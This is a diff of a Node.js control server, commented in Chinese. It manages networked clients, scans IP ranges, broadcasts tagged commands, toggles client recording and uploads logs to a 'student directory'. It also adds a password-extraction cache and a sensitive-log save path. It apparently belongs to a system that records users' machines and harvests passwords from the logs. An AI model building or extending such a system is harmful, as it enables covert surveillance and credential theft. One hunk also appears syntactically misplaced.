@@ -16,57 +16,48 @@ const DailyRotateFile = require('winston-daily-rotate-file');
 const open = require('open');
 const crypto = require('crypto');
 const { LRUCache } = require('lru-cache');
+const rateLimit = require('express-rate-limit');
 
-// ========== 黑名单缓存 ==========
-const blacklistCache = new LRUCache({
-    max: 10000, // 最多缓存10000个哈希
-    ttl: 5 * 60 * 1000, // 5分钟TTL
-    updateAgeOnGet: true
+// ========== 版本缓存 ==========
+const versionCache = new LRUCache({
+    max: 1, // 只缓存一个条目
+    ttl: 1 * 60 * 1000, // 5分钟TTL
 });
-let blacklistLastUpdate = 0;
-const BLACKLIST_UPDATE_INTERVAL = 60 * 1000; // 1分钟更新间隔
 
 // ========== 黑名单缓存管理 ==========
+const BLACKLIST_UPDATE_INTERVAL = 5 * 60 * 1000; // 5分钟更新一次
+const blacklistCache = new Map(); // 密码黑名单缓存
+let blacklistLastUpdate = 0; // 黑名单上次更新时间
+
+let blacklistLoading = false;
+
 async function loadBlacklistCache() {
     const now = Date.now();
     if (now - blacklistLastUpdate < BLACKLIST_UPDATE_INTERVAL && blacklistCache.size > 0) {
-        return; // 缓存未过期
+        return;
     }
-    
+    if (blacklistLoading) return;   // 已在加载中，放弃本次调用
+    blacklistLoading = true;
     try {
-        const blacklistedRows = await executeWithRetry('SELECT password_hash, password FROM password_blacklist', []);
+        const blacklistedRows = await executeWithRetry('SELECT password_hash FROM password_blacklist', []);
         blacklistCache.clear();
         blacklistedRows.forEach(row => {
-            const normalizedPwd = normalizePassword(row.password);
-            blacklistCache.set(row.password_hash, normalizedPwd);
+            blacklistCache.set(row.password_hash, true);
         });
-        blacklistLastUpdate = now;
+        blacklistLastUpdate = Date.now();
         logger.debug(`黑名单缓存已更新，共 ${blacklistedRows.length} 个条目`);
     } catch (error) {
         logger.warn('加载黑名单缓存失败', { error: error.message });
+    } finally {
+        blacklistLoading = false;
     }
 }
 
 function isPasswordBlacklisted(password) {
     const normalizedPwd = normalizePassword(password);
     if (!normalizedPwd) return false;
-    
-    // 检查完全匹配
     const pwdHash = hashPassword(normalizedPwd);
-    if (blacklistCache.has(pwdHash)) {
-        logger.debug(`密码完全匹配黑名单: ${normalizedPwd}`);
-        return true;
-    }
-    
-    // 检查包含匹配：如果黑名单密码是当前密码的子串（长度>=3的密码）
-    for (const blacklistedPwd of blacklistCache.values()) {
-        if (blacklistedPwd && blacklistedPwd.length >= 3 && normalizedPwd.includes(blacklistedPwd)) {
-            logger.debug(`密码包含黑名单项: ${normalizedPwd} 包含 ${blacklistedPwd}`);
-            return true;
-        }
-    }
-    
-    return false;
+    return blacklistCache.has(pwdHash);
 }
 
 // ========== 工具函数：生成自签名证书 ==========
@@ -148,6 +139,7 @@ const CONFIG = {
     alist: {
         url: process.env.ALIST_URL,
         basePath: process.env.ALIST_BASE_PATH || '/学生目录/log',
+        versionPath: process.env.ALIST_VERSION_PATH || '/学生目录/versions',
         username: process.env.ALIST_USERNAME,
         password: process.env.ALIST_PASSWORD,
         tokenRefreshMargin: 5 * 60 * 1000,
@@ -179,6 +171,9 @@ const CONFIG = {
     deleteConcurrency: parseInt(process.env.DELETE_CONCURRENCY) || 10,
     commandConcurrency: parseInt(process.env.COMMAND_CONCURRENCY) || 10,
     heartbeatConcurrency: parseInt(process.env.HEARTBEAT_CONCURRENCY) || 20,
+    // 日志清理相关配置
+    logRetentionDays: parseInt(process.env.LOG_RETENTION_DAYS) || 1,
+    sensitiveLogSavePath: process.env.SENSITIVE_LOG_SAVE_PATH || path.join(__dirname, 'logs', 'windows_security_saves.txt'),
 };
 
 // ========== 环境变量二次校验 ==========
@@ -259,6 +254,16 @@ const asyncHandler = fn => (req, res, next) => {
     Promise.resolve(fn(req, res, next)).catch(next);
 };
 
+// ========== 登录速率限制器 ==========
+const loginLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000,      // 15分钟窗口
+    max: 3,                        // 最多尝试次数
+    skipSuccessfulRequests: true,   // 成功后不计入
+    message: { error: '登录尝试过于频繁，请15分钟后再试' },
+    standardHeaders: true,
+    legacyHeaders: false,
+});
+
 // ========== 认证中间件 ==========
 function authMiddleware(req, res, next) {
     // 允许静态资源和登录页
@@ -271,11 +276,10 @@ function authMiddleware(req, res, next) {
         return next();
     }
     
-    // 允许客户端获取版本列表
-    if (req.path === '/api/versions/list/available') {
+    // 只允许客户端检查更新（无需登录），其他版本管理接口需要认证
+    if (req.path === '/api/update/check') {
         return next();
     }
-    
     // 允许登录相关的路径
     const allowedPaths = ['/login', '/login.html', '/api/login'];
     if (allowedPaths.includes(req.path)) {
@@ -297,7 +301,7 @@ app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-app.post('/api/login', asyncHandler(async (req, res) => {
+app.post('/api/login', loginLimiter, asyncHandler(async (req, res) => {
     const { password } = req.body;
     const clientIP = req.ip || req.connection.remoteAddress || 'unknown';
     
@@ -371,9 +375,13 @@ class AlistClient {
         this.loginPromise = null;
     }
 
-    async _request(method, endpoint, data = null, options = {}, retry = true) {
+    async _request(method, endpoint, data = null, options = {}, retry = true, retryCount = 0, maxRetries = 3) {
         await this._ensureToken();
         const url = `${this.baseUrl}${endpoint}`;
+        this.logger.debug(`发送 ${method} 请求到 ${url}`);
+        if (data) {
+            this.logger.debug(`请求数据: ${JSON.stringify(data)}`);
+        }
         const headers = {
             'Authorization': this.token,
             ...options.headers
@@ -388,13 +396,34 @@ class AlistClient {
             });
             return response.data;
         } catch (error) {
-            if (retry && error.response && error.response.status === 401) {
+            const isDbLocked = error.response?.data?.message?.includes('database is locked');
+            const isNetworkError = !error.response || error.code === 'ECONNREFUSED' || error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT';
+            const shouldRetry = retry && retryCount < maxRetries && (error.response?.status === 401 || error.response?.status === 500 || isDbLocked || isNetworkError);
+            
+            if (error.response) {
+                this.logger.error(`请求失败，响应状态码: ${error.response.status}`);
+                this.logger.error(`响应数据: ${JSON.stringify(error.response.data)}`);
+            } else if (error.request) {
+                this.logger.error(`请求失败，没有收到响应`);
+            } else {
+                this.logger.error(`请求失败，错误: ${error.message}`);
+            }
+            
+            if (shouldRetry) {
+                const delayMs = Math.min(1000 * Math.pow(2, retryCount), 10000);
+                this.logger.warn(`Alist ${isDbLocked ? '数据库锁定' : '请求失败'},${delayMs}ms 后进行第 ${retryCount + 1} 次重试`);
+                await new Promise(resolve => setTimeout(resolve, delayMs));
+                return this._request(method, endpoint, data, options, retry, retryCount + 1, maxRetries);
+            }
+            
+            if (error.response && error.response.status === 401) {
                 this.logger.warn('Token 失效，重新登录');
                 await this._login();
                 headers.Authorization = this.token;
                 const retryResponse = await this.axiosInstance({ method, url, data, headers, ...options });
                 return retryResponse.data;
             }
+            
             this.logger.error(`Alist 请求失败: ${method} ${endpoint}`, { error: error.message });
             throw error;
         }
@@ -449,24 +478,26 @@ class AlistClient {
         } catch (err) {
             if (err.response && err.response.status === 404) {
                 await this._request('POST', '/api/fs/mkdir', { path: fullPath });
-                this.logger.info(`创建目录: ${fullPath}`);
+                this.logger.debug(`创建目录: ${fullPath}`);
             } else {
                 throw err;
             }
         }
     }
 
-    async listFiles(dirPath) {
+    async listFiles(dirPath, force = false, retryCount = 0, maxRetries = 3) {
         const fullPath = this._getFullPath(dirPath);
         const cacheKey = this._getCacheKey('list', fullPath);
 
-        const cached = this.cache.get(cacheKey);
-        if (cached) {
-            return cached;
+        if (!force) {
+            const cached = this.cache.get(cacheKey);
+            if (cached) {
+                return cached;
+            }
         }
 
         try {
-            const result = await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`);
+            const result = await this._request('GET', `/api/fs/list?path=${encodeURIComponent(fullPath)}`, null, {}, true, retryCount, maxRetries);
             if (result.code === 200) {
                 let items = [];
                 if (result.data?.content && Array.isArray(result.data.content)) {
@@ -486,6 +517,7 @@ class AlistClient {
             }
             return [];
         } catch (err) {
+            this.logger.error(`列出目录 ${fullPath} 的文件失败`, { error: err.message });
             if (err.response && err.response.status === 404) {
                 return [];
             }
@@ -493,30 +525,55 @@ class AlistClient {
         }
     }
 
-    async readFile(filePath) {
+    async readFile(filePath, retryCount = 0, maxRetries = 5) {
         const fullPath = this._getFullPath(filePath);
-        const result = await this._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`);
+        try {
+            const result = await this._request('GET', `/api/fs/get?path=${encodeURIComponent(fullPath)}`, null, {}, true, retryCount, maxRetries);
 
-        if (result.code === 200 && result.data) {
-            let buffer;
-            if (result.data.raw_url) {
-                const response = await this.axiosInstance.get(result.data.raw_url, {
-                    responseType: 'arraybuffer',
-                    headers: { 'Authorization': this.token }
-                });
-                buffer = Buffer.from(response.data);
-            } else if (result.data.content) {
-                buffer = Buffer.from(result.data.content, 'base64');
-            } else {
-                throw new Error('无法获取文件内容');
+            if (result.code === 200 && result.data) {
+                let buffer;
+                if (result.data.raw_url) {
+                    const response = await this.axiosInstance.get(result.data.raw_url, {
+                        responseType: 'arraybuffer',
+                        headers: { 'Authorization': this.token },
+                        timeout: 30000
+                    });
+                    buffer = Buffer.from(response.data);
+                } else if (result.data.content) {
+                    buffer = Buffer.from(result.data.content, 'base64');
+                } else {
+                    // === 增加兜底：使用 Alist 公共直链 /d/ ===
+                    const downloadUrl = `${this.baseUrl}/d${encodeURI(fullPath)}`;
+                    this.logger.warn(`raw_url 和 content 均缺，改用直链: ${downloadUrl}`);
+                    const response = await this.axiosInstance.get(downloadUrl, {
+                        responseType: 'arraybuffer',
+                        headers: { 'Authorization': this.token },
+                        timeout: 30000
+                    });
+                    buffer = Buffer.from(response.data);
+                }
+
+                const detected = jschardet.detect(buffer);
+                const encoding = detected.encoding || 'utf-8';
+                return iconv.decode(buffer, encoding);
             }
 
-            const detected = jschardet.detect(buffer);
-            const encoding = detected.encoding || 'utf-8';
-            this.logger.debug(`文件编码检测: ${filePath} -> ${encoding} (置信度: ${detected.confidence})`);
-            return iconv.decode(buffer, encoding);
+            this.logger.error(`读取文件失败，Alist 返回值异常`, { path: fullPath, response: result });
+            throw new Error('文件内容获取失败或文件不存在');
+        } catch (err) {
+            const isDbLocked = err.message?.includes('database is locked');
+            const isNetworkError = err.code === 'ECONNREFUSED' || err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ENOTFOUND';
+            const shouldRetry = retryCount < maxRetries && (isDbLocked || isNetworkError || err.response?.status === 500);
+            
+            if (shouldRetry) {
+                const delayMs = Math.min(1000 * Math.pow(2, retryCount), 15000);
+                this.logger.warn(`读取文件 ${fullPath} ${isDbLocked ? '数据库锁定' : '网络错误'},${delayMs}ms 后进行第 ${retryCount + 1} 次重试`);
+                await new Promise(resolve => setTimeout(resolve, delayMs));
+                return this.readFile(filePath, retryCount + 1, maxRetries);
+            }
+            
+            throw err;
         }
-        throw new Error('文件内容获取失败或文件不存在');
     }
 
     async downloadFile(filePath, res) {
@@ -565,28 +622,71 @@ class AlistClient {
             }
         });
         this._invalidateCache(this._getCacheKey('list', fullDir));
-        this.logger.info(`文件上传成功: ${fullPath}`);
+        this.logger.debug(`文件上传成功: ${fullPath}`);
         return { success: true, filename };
     }
 
     async deleteFile(filePath) {
         const fullPath = this._getFullPath(filePath);
-        const lastSlash = fullPath.lastIndexOf('/');
-        const dir = lastSlash > 0 ? fullPath.substring(0, lastSlash) : '/';
-        const filename = fullPath.substring(lastSlash + 1);
+        const dirPath = path.dirname(fullPath);
+        const name = path.basename(fullPath);
 
-        await this._request('POST', '/api/fs/remove', {
-            path: dir,
-            names: [filename]
-        });
+        // 优先使用 dir 字段（兼容最新版 Alist）
+        try {
+            const result = await this._request('POST', '/api/fs/remove', {
+                dir: dirPath,
+                names: [name]
+            });
+            if (result && result.code !== 200) {
+                throw new Error(`Alist 返回错误: ${result.message || '未知'}`);
+            }
+        } catch (firstError) {
+            this.logger.warn(`首选删除失败 (${fullPath})，尝试备选 path 方式`);
+            try {
+                const result = await this._request('POST', '/api/fs/remove', {
+                    path: dirPath,
+                    names: [name]
+                });
+                if (result && result.code !== 200) {
+                    throw new Error(`Alist 返回错误: ${result.message || '未知'}`);
+                }
+            } catch (secondError) {
+                // 最终尝试 DELETE 方法
+                this.logger.warn(`path 方式也失败，尝试 DELETE 接口`);
+                const delResult = await this._request('DELETE', `/api/fs/remove?path=${encodeURIComponent(fullPath)}`);
+                if (delResult && delResult.code !== 200) {
+                    this.logger.error(`所有删除方式均失败: ${fullPath}`, { error: delResult.message });
+                    throw new Error(`删除文件失败: ${delResult.message || '未知错误'}`);
+                }
+            }
+        }
 
-        this._invalidateCache(this._getCacheKey('list', dir));
-        this.logger.info(`文件已删除: ${fullPath}`);
+        // 清理缓存
+        this._invalidateCache(this._getCacheKey('list', dirPath));
+        this.logger.debug(`文件已删除: ${fullPath}`);
         return { success: true };
     }
 }
 
 const alistClient = new AlistClient(CONFIG.alist);
+
+// ========== 密码提取缓存（提前声明，供黑名单路由使用）==========
+const extractionCache = {
+    lastExtractTime: 0,
+    passwords: [],
+    fileMTimes: new LRUCache({
+        max: 500,
+        ttl: 1000 * 60 * 60,
+        updateAgeOnGet: true
+    })
+};
+
+function resetExtractionCache() {
+    extractionCache.fileMTimes.clear();
+    extractionCache.lastExtractTime = 0;
+    extractionCache.passwords = [];
+    logger.debug('密码提取缓存已重置');
+}
 
 // ========== MySQL 数据库 ==========
 const dbPoolConfig = {
@@ -668,7 +768,8 @@ async function initDatabase() {
                 ip VARCHAR(45) NOT NULL,
                 port INT NOT NULL,
                 last_seen BIGINT COMMENT '最后在线时间戳（毫秒）',
-                created_at BIGINT COMMENT '创建时间戳（毫秒）'
+                created_at BIGINT COMMENT '创建时间戳（毫秒）',
+                tags TEXT COMMENT '客户端标签 JSON 数组'
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
         `);
 
@@ -687,11 +788,39 @@ async function initDatabase() {
                 version VARCHAR(20) NOT NULL UNIQUE COMMENT '版本号，如 1.0.1',
                 download_url TEXT NOT NULL COMMENT '下载链接',
                 is_active BOOLEAN DEFAULT FALSE COMMENT '是否为当前激活版本',
-                force_update BOOLEAN DEFAULT FALSE COMMENT '是否强制更新',
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
         `);
+        const [indexExists] = await executeWithRetry(
+            `SELECT 1 FROM INFORMATION_SCHEMA.STATISTICS 
+             WHERE table_schema = DATABASE() 
+               AND table_name = 'known_clients' 
+               AND index_name = 'idx_last_seen'`,
+            []
+        );
+        if (!indexExists) {
+            await executeWithRetry(
+                'ALTER TABLE known_clients ADD INDEX idx_last_seen (last_seen)',
+                []
+            );
+            logger.debug('已为 known_clients 添加 last_seen 索引');
+        }
+
+        const [tagsColumn] = await executeWithRetry(
+            `SELECT 1 FROM INFORMATION_SCHEMA.COLUMNS 
+             WHERE table_schema = DATABASE() 
+               AND table_name = 'known_clients' 
+               AND column_name = 'tags'`,
+            []
+        );
+        if (!tagsColumn) {
+            await executeWithRetry(
+                "ALTER TABLE known_clients ADD COLUMN tags TEXT COMMENT '客户端标签 JSON 数组'",
+                []
+            );
+            logger.debug('已为 known_clients 添加 tags 字段');
+        }
 
         logger.info('MySQL 数据库表初始化完成');
     } catch (error) {
@@ -702,13 +831,23 @@ async function initDatabase() {
 
 async function loadKnownClientsFromDB() {
     try {
-        const rows = await executeWithRetry('SELECT id, ip, port, last_seen FROM known_clients');
+        const rows = await executeWithRetry('SELECT id, ip, port, last_seen, tags FROM known_clients');
         const clientsMap = new Map();
         rows.forEach(row => {
+            let tags = [];
+            if (row.tags) {
+                try {
+                    tags = JSON.parse(row.tags);
+                    if (!Array.isArray(tags)) tags = [];
+                } catch (e) {
+                    tags = [];
+                }
+            }
             clientsMap.set(row.id, {
                 ip: row.ip,
                 port: row.port,
-                lastSeen: row.last_seen ? new Date(row.last_seen) : null
+                lastSeen: row.last_seen ? new Date(row.last_seen) : null,
+                tags
             });
         });
         logger.info(`从数据库加载了 ${clientsMap.size} 个已知客户端`);
@@ -748,10 +887,21 @@ async function updateLastSeen(clientId) {
     }
 }
 
+async function updateKnownClientTags(clientId, tags) {
+    try {
+        await executeWithRetry(
+            'UPDATE known_clients SET tags = ? WHERE id = ?',
+            [JSON.stringify(tags), clientId]
+        );
+    } catch (error) {
+        logger.warn('更新客户端标签失败', { error: error.message, clientId });
+    }
+}
+
 async function deleteKnownClientFromDB(clientId) {
     try {
         await executeWithRetry('DELETE FROM known_clients WHERE id = ?', [clientId]);
-        logger.info(`数据库记录已删除: ${clientId}`);
+        logger.debug(`数据库记录已删除: ${clientId}`);
     } catch (error) {
         logger.warn('从数据库删除客户端失败', { error: error.message, clientId });
     }
@@ -763,6 +913,8 @@ class ClientManager {
         this.clients = new Map();
         this.knownClients = new Map();
         this.webClients = new Set();
+        this.consoleSubscriptions = new Map(); // clientId -> Set<WebSocket>
+        this.consoleSubscriptionsByWs = new Map(); // WebSocket -> Set<clientId>
         this.tcpServer = null;
         this.heartbeatTimer = null;
         this.reconnectLimit = pLimit(CONFIG.maxConcurrentReconnects);
@@ -770,8 +922,13 @@ class ClientManager {
     }
 
     async init() {
-        await initDatabase();
-        this.knownClients = await loadKnownClientsFromDB();
+        try {
+            await initDatabase();
+            this.knownClients = await loadKnownClientsFromDB();
+        } catch (error) {
+            this.logger.warn('数据库初始化失败，继续启动服务器', { error: error.message });
+            this.knownClients = new Map();
+        }
 
         this.startTcpServer();
         this.startHeartbeat();
@@ -786,6 +943,7 @@ class ClientManager {
 
             this.logger.info(`客户端主动连接: ${clientId}`);
 
+            const existingKnown = this.knownClients.get(clientId);
             const client = {
                 id: clientId,
                 ip: remoteAddress,
@@ -796,7 +954,8 @@ class ClientManager {
                 uploadEnabled: false,
                 lastSeen: new Date(),
                 logDir: alistClient.basePath,
-                shouldReconnect: false
+                shouldReconnect: false,
+                tags: existingKnown?.tags || []
             };
 
             const existing = this.clients.get(clientId);
@@ -809,7 +968,8 @@ class ClientManager {
             this.knownClients.set(clientId, {
                 ip: remoteAddress,
                 port: remotePort,
-                lastSeen: new Date()
+                lastSeen: new Date(),
+                tags: existingKnown?.tags || []
             });
             saveKnownClientToDB(clientId, remoteAddress, remotePort).catch(e => this.logger.error(e));
 
@@ -847,7 +1007,7 @@ class ClientManager {
 
         currentSocket.on('close', () => {
             if (client.socket === currentSocket) {
-                this.logger.info(`客户端 ${client.id} 连接断开`);
+                this.logger.debug(`客户端 ${client.id} 连接断开`);
                 this.markClientOffline(client);
             }
         });
@@ -888,12 +1048,60 @@ class ClientManager {
         }
     }
 
+    const processed = this.formatConsoleMessage(response);
+    this.sendConsoleMessage(client.id, response, processed);
+
     this.broadcastToWeb({
         type: 'client_response',
         clientId: client.id,
         response
     });
 }
+
+    formatConsoleMessage(response) {
+        if (!response || typeof response !== 'object') {
+            return `收到原始响应: ${String(response)}`;
+        }
+
+        const pieces = [];
+        if (response.status !== undefined) {
+            pieces.push(`状态: ${response.status}`);
+        }
+        if (response.error) {
+            pieces.push(`错误: ${response.error}`);
+        }
+        if (response.action) {
+            pieces.push(`动作: ${response.action}`);
+        }
+        if (response.message) {
+            pieces.push(`${response.message}`);
+        }
+        if (response.result !== undefined) {
+            pieces.push(`结果: ${JSON.stringify(response.result)}`);
+        }
+        if (response.data && typeof response.data === 'object') {
+            const knownKeys = [];
+            if (response.data.recording !== undefined) {
+                knownKeys.push(`录制: ${response.data.recording ? '开启' : '关闭'}`);
+            }
+            if (response.data.upload_enabled !== undefined) {
+                knownKeys.push(`上传: ${response.data.upload_enabled ? '启用' : '禁用'}`);
+            }
+            if (response.data.version) {
+                knownKeys.push(`版本: ${response.data.version}`);
+            }
+            if (response.data.log_dir) {
+                knownKeys.push(`日志目录: ${response.data.log_dir}`);
+            }
+            if (knownKeys.length > 0) {
+                pieces.push(knownKeys.join(' | '));
+            }
+        }
+        if (pieces.length === 0) {
+            return `收到原始响应: ${JSON.stringify(response)}`;
+        }
+        return pieces.join(' | ');
+    }
 
     sendCommand(clientId, command) {
         const client = this.clients.get(clientId);
@@ -913,14 +1121,18 @@ class ClientManager {
         });
     }
 
-    async broadcastCommand(command) {
+    async broadcastCommand(command, tag = '') {
+        const tagFilter = String(tag || '').trim().toLowerCase();
         const tasks = [];
         for (const [clientId, client] of this.clients) {
-            if (client.status === 'online') {
-                tasks.push(
-                    this.sendCommand(clientId, command).then(result => ({ clientId, ...result }))
-                );
+            if (client.status !== 'online') continue;
+            if (tagFilter) {
+                const tags = Array.isArray(client.tags) ? client.tags : [];
+                if (!tags.some(t => String(t).toLowerCase().includes(tagFilter))) continue;
             }
+            tasks.push(
+                this.sendCommand(clientId, command).then(result => ({ clientId, ...result }))
+            );
         }
         return Promise.all(tasks);
     }
@@ -928,24 +1140,29 @@ class ClientManager {
     startHeartbeat() {
         const limit = pLimit(CONFIG.heartbeatConcurrency);
         this.heartbeatTimer = setInterval(() => {
-            const heartbeatTasks = [];
-            this.clients.forEach((client, clientId) => {
+            // 创建快照避免遍历时修改导致的竞态条件
+            const onlineClients = [];
+            for (const [clientId, client] of this.clients) {
                 if (client.status === 'online') {
-                    heartbeatTasks.push(limit(async () => {
-                        try {
-                            const result = await this.sendCommand(clientId, { action: 'ping' });
-                            if (!result.success) {
-                                this.logger.warn(`心跳失败: ${clientId}`);
-                                this.markClientOffline(client);
-                                this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
-                            }
-                        } catch (e) {
-                            this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
+                    onlineClients.push({ clientId, client });
+                }
+            }
+            
+            const heartbeatTasks = onlineClients.map(({ clientId, client }) => {
+                return limit(async () => {
+                    try {
+                        const result = await this.sendCommand(clientId, { action: 'ping' });
+                        if (!result.success) {
+                            this.logger.warn(`心跳失败: ${clientId}`);
                             this.markClientOffline(client);
                             this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
                         }
-                    }));
-                }
+                    } catch (e) {
+                        this.logger.warn(`心跳异常: ${clientId}`, { error: e.message });
+                        this.markClientOffline(client);
+                        this.reconnectSingleClient(clientId).catch(e => this.logger.error(e));
+                    }
+                });
             });
             Promise.allSettled(heartbeatTasks).catch(err => this.logger.error('心跳批量任务异常', { error: err.message }));
         }, CONFIG.heartbeatInterval);
@@ -972,10 +1189,10 @@ class ClientManager {
                 this.logger.warn(`尝试重连未知客户端: ${clientId}`);
                 return;
             }
-            this.logger.info(`尝试重连: ${clientId}`);
+            this.logger.debug(`尝试重连: ${clientId}`);
             const clientInfo = await this.tryConnect(info.ip, info.port);
             if (clientInfo) {
-                this.logger.info(`重连成功: ${clientId}`);
+                this.logger.debug(`重连成功: ${clientId}`);
             } else {
                 this.logger.debug(`重连失败: ${clientId}`);
             }
@@ -1007,7 +1224,8 @@ class ClientManager {
             status: client.status,
             recording: client.recording,
             uploadEnabled: client.uploadEnabled,
-            lastSeen: client.lastSeen
+            lastSeen: client.lastSeen,
+            tags: client.tags || (this.knownClients.get(client.id)?.tags || [])
         };
     }
 
@@ -1025,7 +1243,8 @@ class ClientManager {
                     status: 'offline',
                     recording: false,
                     uploadEnabled: false,
-                    lastSeen: info.lastSeen
+                    lastSeen: info.lastSeen,
+                    tags: info.tags || []
                 });
             }
         }
@@ -1042,52 +1261,173 @@ class ClientManager {
 
     removeWebClient(ws) {
         this.webClients.delete(ws);
+        this.removeConsoleSubscriptions(ws);
+    }
+
+    subscribeConsole(ws, clientId) {
+        if (!ws || !clientId) return;
+        let subs = this.consoleSubscriptions.get(clientId);
+        if (!subs) {
+            subs = new Set();
+            this.consoleSubscriptions.set(clientId, subs);
+        }
+        subs.add(ws);
+
+        let wsSubs = this.consoleSubscriptionsByWs.get(ws);
+        if (!wsSubs) {
+            wsSubs = new Set();
+            this.consoleSubscriptionsByWs.set(ws, wsSubs);
+        }
+        wsSubs.add(clientId);
+    }
+
+    unsubscribeConsole(ws, clientId) {
+        if (!ws || !clientId) return;
+        const subs = this.consoleSubscriptions.get(clientId);
+        if (subs) {
+            subs.delete(ws);
+            if (subs.size === 0) {
+                this.consoleSubscriptions.delete(clientId);
+            }
+        }
+        const wsSubs = this.consoleSubscriptionsByWs.get(ws);
+        if (wsSubs) {
+            wsSubs.delete(clientId);
+            if (wsSubs.size === 0) {
+                this.consoleSubscriptionsByWs.delete(ws);
+            }
+        }
+    }
+
+    removeConsoleSubscriptions(ws) {
+        const wsSubs = this.consoleSubscriptionsByWs.get(ws);
+        if (!wsSubs) return;
+        for (const clientId of wsSubs) {
+            const subs = this.consoleSubscriptions.get(clientId);
+            if (subs) {
+                subs.delete(ws);
+                if (subs.size === 0) {
+                    this.consoleSubscriptions.delete(clientId);
+                }
+            }
+        }
+        this.consoleSubscriptionsByWs.delete(ws);
+    }
+
+    sendConsoleMessage(clientId, raw, processed) {
+        const subs = this.consoleSubscriptions.get(clientId);
+        if (!subs || subs.size === 0) return;
+        const message = JSON.stringify({
+            type: 'console_message',
+            clientId,
+            timestamp: Date.now(),
+            raw,
+            processed
+        });
+        const toRemove = [];
+        subs.forEach(ws => {
+            if (ws.readyState !== WebSocket.OPEN) {
+                toRemove.push(ws);
+                return;
+            }
+            ws.send(message, (err) => {
+                if (err) this.logger.debug('控制台消息发送失败', { error: err.message });
+            });
+        });
+        toRemove.forEach(ws => {
+            subs.delete(ws);
+            const wsSubs = this.consoleSubscriptionsByWs.get(ws);
+            if (wsSubs) {
+                wsSubs.delete(clientId);
+                if (wsSubs.size === 0) this.consoleSubscriptionsByWs.delete(ws);
+            }
+        });
+        if (subs.size === 0) {
+            this.consoleSubscriptions.delete(clientId);
+        }
     }
 
     broadcastClientUpdate(client, eventType) {
         const message = JSON.stringify({
-            type: 'client_updated',
-            event: eventType,
-            client: this.getClientInfo(client)
+        type: 'client_updated',
+        event: eventType,
+        client: this.getClientInfo(client)
         });
 
+        const toRemove = [];
+
         this.webClients.forEach(ws => {
-            if (ws.readyState === WebSocket.OPEN) {
-                if (ws.bufferedAmount > 64 * 1024) {
-                    this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，延迟广播`);
-                    setTimeout(() => {
-                        if (ws.readyState === WebSocket.OPEN) {
-                            ws.send(message, (err) => {
-                                if (err) this.logger.debug('延迟广播发送失败', { error: err.message });
-                            });
-                        }
-                    }, 100);
-                    return;
-                }
-                setImmediate(() => {
-                    ws.send(message, (err) => {
-                        if (err) this.logger.debug('广播消息发送失败', { error: err.message });
-                    });
-                });
+            if (ws.readyState !== WebSocket.OPEN) {
+                toRemove.push(ws);
+                return;
             }
+
+            if (ws.bufferedAmount > 64 * 1024) {
+                this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，延迟广播`);
+                setTimeout(() => {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        ws.send(message, (err) => {
+                            if (err) this.logger.debug('延迟广播发送失败', { error: err.message });
+                        });
+                    }
+                }, 100);
+                return;
+            }
+
+            setImmediate(() => {
+                ws.send(message, (err) => {
+                    if (err) this.logger.debug('广播消息发送失败', { error: err.message });
+                });
+            });
         });
+
+        toRemove.forEach(ws => this.webClients.delete(ws));
     }
 
     broadcastToWeb(data) {
         const message = JSON.stringify(data);
+        const toRemove = [];   // 收集需要断开的连接
+
         this.webClients.forEach(ws => {
-            if (ws.readyState === WebSocket.OPEN) {
-                if (ws.bufferedAmount > 64 * 1024) {
-                    this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，丢弃单条消息`);
-                    return;
-                }
-                setImmediate(() => {
-                    ws.send(message, (err) => {
-                        if (err) this.logger.debug('单条消息发送失败', { error: err.message });
-                    });
-                });
+            if (ws.readyState !== WebSocket.OPEN) {
+                toRemove.push(ws);
+                return;
             }
+
+            // 积压超过 512KB，直接断开连接
+            if (ws.bufferedAmount > 512 * 1024) {
+                this.logger.warn(`WebSocket 积压过高 (${ws.bufferedAmount} 字节)，断开连接`);
+                ws.terminate();
+                toRemove.push(ws);
+                return;
+            }
+
+            // 积压超过 64KB 但未超过 512KB，延迟发送
+            if (ws.bufferedAmount > 64 * 1024) {
+                this.logger.debug(`WebSocket 积压 (${ws.bufferedAmount} 字节)，延迟发送`);
+                setTimeout(() => {
+                    if (ws.readyState === WebSocket.OPEN && ws.bufferedAmount <= 512 * 1024) {
+                        ws.send(message, (err) => {
+                            if (err) this.logger.debug('延迟发送失败', { error: err.message });
+                        });
+                    } else if (ws.readyState === WebSocket.OPEN) {
+                        ws.terminate();
+                        // 注意：这里延迟删除需要去重，简化处理直接忽略可能重复删除
+                    }
+                }, 100);
+                return;
+            }
+
+            // 正常立即发送
+            setImmediate(() => {
+                ws.send(message, (err) => {
+                    if (err) this.logger.debug('广播消息发送失败', { error: err.message });
+                });
+            });
         });
+
+        // 统一移除已断开或待移除的连接
+        toRemove.forEach(ws => this.webClients.delete(ws));
     }
 
     async scanNetwork(startIp, endIp, ports = CONFIG.scanPorts) {
@@ -1163,16 +1503,29 @@ class ClientManager {
             const onConnect = () => {
                 socket.write(JSON.stringify({ action: 'ping' }) + '\n', (err) => {
                     if (err) return cleanup(null);
-                    const responseTimeout = setTimeout(() => cleanup(null), 2000);
+                    let responseTimeout = null;
+                    
+                    const clearResponseTimeout = () => {
+                        if (responseTimeout) {
+                            clearTimeout(responseTimeout);
+                            responseTimeout = null;
+                        }
+                    };
+                    
+                    responseTimeout = setTimeout(() => {
+                        clearResponseTimeout();
+                        cleanup(null);
+                    }, 2000);
 
                     const onData = (data) => {
-                        clearTimeout(responseTimeout);
+                        clearResponseTimeout();
                         try {
